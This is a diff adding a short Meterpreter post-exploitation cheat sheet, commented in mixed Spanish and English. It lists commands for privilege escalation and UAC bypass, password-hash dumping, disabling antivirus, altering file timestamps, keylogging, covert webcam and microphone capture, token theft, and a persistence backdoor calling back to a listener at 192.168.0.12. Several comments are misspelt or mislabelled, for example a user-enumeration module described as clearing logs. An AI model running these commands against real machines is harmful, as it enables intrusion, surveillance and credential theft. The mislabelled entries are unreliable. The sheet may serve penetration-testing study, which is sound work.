@@ -1,0 +1,66 @@
+
+--- * Meterpreter comands *----
+
+
+### Meterpreter manage ###
+lcd 						# moverse en el directorio local
+getlwd						# directorio en la maquina metasploit
+backgraund					# Send to background
+sessions -l					# see seasons
+sessions -i <numero sesion>	# select sasson 
+portfwd add -l 9000 -p 80 -r 192.168.1.106	# port forwarding
+load -l 					# modulos dispnibles
+load incognito 				# load module
+help module 				# View help info of module
+
+
+### Information gathering ###
+getuid 						# how am i
+sysinfo						# info del sistema
+enumdesktops				# enumerar escritorios
+webcam_list					# listas de webcams
+idletime					# tiempo que el usuario no usa la maquina
+
+
+### Actions ###
+getprivs					# Posivilidades de elvebacion de privilejios
+getsystem 					# elevacion de privilegios
+hasdump						# obtencion de hashes
+killav 						# desactivar antivurus
+timestomp 					# modificacion de fechas de ficheros
+uictl disable mouse/keyboard	# desabilitar raton o teclado
+screenshot					# imagen de pantalla 
+webcam_snap					# snap de imagen
+record_mic					# graba de microfono
+keyscan_start				# iniciar keyloger
+keyscan_dump				# visualizar estado del keyloger
+execute -f cmd.exe -i -H	# Create a cmd promtr shell
+
+
+### Transfer Files ###
+upload <origen> <destino>	# upload file
+upload /home/ubuntu/owned.txt C:\\Users\\agaga\\Desktop 	# Descargar archivos server-->targer
+download 	# Descargar archivos target->server
+
+
+### Modulo incognito ###
+- add_group_user Stinki sticki
+- list_tokens -u
+- snarf_hashes 192.168.1.103
+
+
+### Use Scripst ###
+run post/windows/manage/migrate		# migrar el proceso de meterpreter
+run post/windows/gather 	# Recolectar informacion
+run post/windows/wlan/wlan_ 	# Wlan Discober
+run post/windows/escalate/bypassuac 	#Elevar privilejios
+run post/windows/gather/cachedump 	# Usuarios del dominio
+run post/windows/gather/enum_logged_on_users		# clear logs
+run post/windows/gather/enum_snmp	# SMP config
+run post/windows/gather/hashdump	# Hash Dump
+run post/windows/gather/usb_history # USBs conectados
+run persistence -U -i 5 -p 80 -r 192.168.0.12 	# persistencia
+run post/windows/gather/enum_applications	# Enumeracion de aplicaciones instaladas
+
+
+ 
